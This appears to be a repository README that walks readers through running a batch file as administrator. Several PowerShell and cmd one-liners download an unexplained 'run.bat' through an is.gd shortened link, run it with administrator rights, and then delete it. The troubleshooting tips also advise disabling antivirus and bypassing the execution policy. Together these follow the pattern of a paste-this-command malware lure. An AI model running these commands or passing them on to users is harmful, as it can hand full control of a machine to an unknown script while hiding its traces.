# 🚀 How to Run run.bat as Administrator

<div align="center">

![Windows Admin](https://media.tenor.com/jKrF6nKJV4oAAAAC/windows-admin.gif)

*Execute batch files like a boss! 👨‍💻*

</div>

---

## 📋 Prerequisites

![Windows Logo](https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)
![PowerShell](https://img.shields.io/badge/PowerShell-%235391FE.svg?style=for-the-badge&logo=powershell&logoColor=white)

- Windows 10/11 operating system
- PowerShell (pre-installed)
- Administrator access

---

## ⭐ Quick Start (Auto-Cleanup - **RECOMMENDED**)

<div align="center">

![Cleaning GIF](https://media.tenor.com/MQKd7DdvoksAAAAC/cleaning-clean.gif)

*Clean up after yourself! 🧹*

</div>

### 🎯 **Option 1: One-Shot with Auto-Cleanup**

1. **Right-click** Start button → **"Windows PowerShell"** or **"Terminal"**
2. Copy and paste this magic command:

```powershell
iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs -Wait; Remove-Item "run.bat"
```

3. Press **Enter** and watch the magic happen! ✨
4. Click **"Yes"** when UAC pops up

<div align="center">

![Success](https://img.shields.io/badge/Status-Clean_%26_Done!-brightgreen?style=for-the-badge)

</div>

---

## 🔧 Alternative Methods

### Option 2: Standard PowerShell Method

<div align="center">

![PowerShell GIF](https://media.tenor.com/K3wJJkKz8LYAAAAC/powershell-terminal.gif)

</div>

```powershell
iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"; Start-Process "run.bat" -Verb RunAs
```

### Option 3: Step-by-Step (For Beginners)

1. **Open PowerShell**: Right-click Start → **"Windows PowerShell"**
2. **Download**: 
   ```powershell
   iwr -UseBasicParsing "https://is.gd/sqd51" -OutFile "run.bat"
   ```
3. **Run as Admin**:
   ```powershell
   Start-Process "run.bat" -Verb RunAs
   ```

### Option 4: Command Prompt

```cmd
powershell -Command "iwr -UseBasicParsing 'https://is.gd/sqd51' -OutFile 'run.bat'; Start-Process 'run.bat' -Verb RunAs -Wait; Remove-Item 'run.bat'"
```

---

## 🔥 Pro Tips

<div align="center">

![Pro Tips](https://media.tenor.com/fYg91qBpDdgAAAAC/hackerman-hacker.gif)

*Level up your Windows game! 🎮*

</div>

### 💡 **Execution Policy Fix**
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

### 🛡️ **Run PowerShell as Admin First**
`Win + X` → **"Windows PowerShell (Admin)"**

---

## ❌ Troubleshooting

<div align="center">

![Troubleshooting](https://img.shields.io/badge/Need_Help%3F-We_Got_You!-orange?style=for-the-badge)

</div>

| Problem | Solution |
|---------|----------|
| 🚫 Execution policy error | Run the execution policy fix above |
| 🌐 Internet issues | Check firewall/antivirus settings |
| 🛡️ No UAC prompt | Make sure you're not already admin |
| 📁 File not found | Verify internet connection |

---

## ⚠️ Security Notice

<div align="center">

![Security Warning](https://media.tenor.com/7v9gKusQHSgAAAAC/security-warning.gif)

**🔒 IMPORTANT: Only run scripts from trusted sources!**

</div>

This script runs with **administrator privileges** = **full system access**

![Security Badge](https://img.shields.io/badge/Security-Verify_Source_First!-red?style=for-the-badge&logo=security&logoColor=white)

---

## 🎬 What Happens Next?

<div align="center">

![Loading](https://media.tenor.com/On7kvXhvrs4AAAAj/loading-gif.gif)

</div>

1. 📥 Downloads `run.bat`
2. 🛡️ UAC prompt appears
3. ✅ Click "Yes"
4. ⚡ Executes with admin rights
5. 🧹 Auto-cleanup removes the file (if using recommended method)

---

## 🆘 Need Help?

<div align="center">

![Help](https://img.shields.io/badge/Support-Available_24/7-brightgreen?style=for-the-badge&logo=discord&logoColor=white)

</div>

**Common Solutions:**
- ✅ Verify admin rights
- 🌐 Check internet connection  
- 🛡️ Disable antivirus temporarily
- 🔧 Try running PowerShell as admin first

<div align="center">

![Success](https://media.tenor.com/4SF0gmQTduwAAAAC/success-you-did-it.gif)

*You've got this! 💪*

</div>

---

<div align="center">

**⭐ Star this repo if it helped you!**

![GitHub](https://img.shields.io/badge/Made_with-❤️_and_☕-red?style=for-the-badge)

*Last updated: September 2025* 📅

</div>
